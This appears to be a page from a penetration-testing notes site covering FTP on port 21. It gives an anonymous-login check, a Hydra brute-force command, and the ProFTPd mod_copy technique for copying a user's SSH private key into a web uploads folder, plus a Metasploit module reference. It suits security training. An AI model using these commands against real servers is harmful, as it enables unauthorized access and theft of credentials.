---
layout: default
title: FTP
parent: TCP
nav_order: 4-1
---
# FTP | 21
## Methodology
- Check for anonymous login 
```
ftp $IP 21
anonymous : anonymous
```
- If anonymous login doesn't work, move on or try for a brute-force in the background
<br />

## Command Reference
- Download: ```get $file```
- Upload: ```put $file```
<br />

## Brute-Force
- Hydra
``` 
hydra -l username -P /usr/share/worlists/rockyou.txt -f $IP ftp -V
```

## Vulnerabilities
- Always check custom FTP software versions for vulnerabilities on searchsploit/metasploit
<b>Mod_Copy ProFTPd</b>
By using 'CPFR' <file> and 'CPTO' <file> you can copy any protected file into any accessible file location. For example copy a user SSH key:
```
nc $IP 21
site help
214-CPFR <sp> pathname
214-CPTO <sp> pathname
site cpfr /home/user/.ssh/id_rsa
site cpto /var/www/uploads/id_rsa
```

{: .note }
ProFTPd: mod_copy vulnerability - command execution. Use  MSF: use exploit/unix/ftp/proftpd_modcopy_exec) 

